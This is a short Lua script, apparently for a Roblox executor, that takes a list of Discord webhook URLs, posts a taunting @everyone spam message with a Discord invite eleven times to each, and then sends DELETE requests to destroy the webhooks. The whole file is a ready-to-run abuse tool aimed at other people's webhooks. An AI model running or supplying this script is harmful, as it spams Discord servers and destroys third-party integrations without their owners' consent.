local message=[[add me, 25ms here on discord
dm me to prevent yourself from fumbling like this @everyone
or join https://discord.gg/h8mHMTf2bA]]

local hooklinks={...}

local function firewh(hook, txt)
    request({
        Url = hook,
        Method = "POST",
        Body = game:GetService("HttpService"):JSONEncode({content = txt}),
        Headers = {["Content-Type"] = "application/json"}
    })
end

local function deletewh(hook)
    request({Url=hook, Method = "DELETE",Headers = {["Content-Type"] = "application/json"},Body = game:GetService("HttpService"):JSONEncode({})})
end

for _, link in hooklinks do
    for i = 0, 10 do
        firewh(link, message)
        wait(.3)
    end
    wait(3)
    deletewh(link)
end
